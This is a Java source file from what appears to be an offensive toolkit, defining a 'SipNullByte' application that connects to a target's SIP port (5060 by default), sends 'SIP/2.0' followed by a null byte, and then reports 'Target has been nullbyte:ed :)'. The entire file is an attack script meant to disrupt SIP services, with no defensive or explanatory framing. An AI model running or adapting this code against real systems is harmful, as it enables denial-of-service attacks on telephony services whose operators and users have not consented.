package pn.mongoose.applications;

import pn.mongoose.applications.base.ApplicationBase;


import java.net.InetSocketAddress;
import java.net.Socket;

public class SipNullByte extends ApplicationBase {


    public SipNullByte(String[] args) {
        super(args);
    }

    @Override
    protected void RunApplication(String... args) {

        int port;

        if (args[1].equalsIgnoreCase("DEFAULT")) {
            port = 5060;
        } else {

            port = Integer.parseInt(args[1]);
        }

        Socket socket = new Socket();
        byte[] bytes = new byte[1];
        try {
            socket.connect(new InetSocketAddress(args[0], port));
            socket.getOutputStream().write("SIP/2.0".getBytes());
            socket.getOutputStream().write(bytes);
            System.out.println("Target has been nullbyte:ed :)");
        } catch (Exception e) {
            e.printStackTrace();

            System.out.println("Either your URL is wrong or the target does not use SIP");
        }
    }

    @Override
    public void run() {

        RunApplication(args);
    }
}
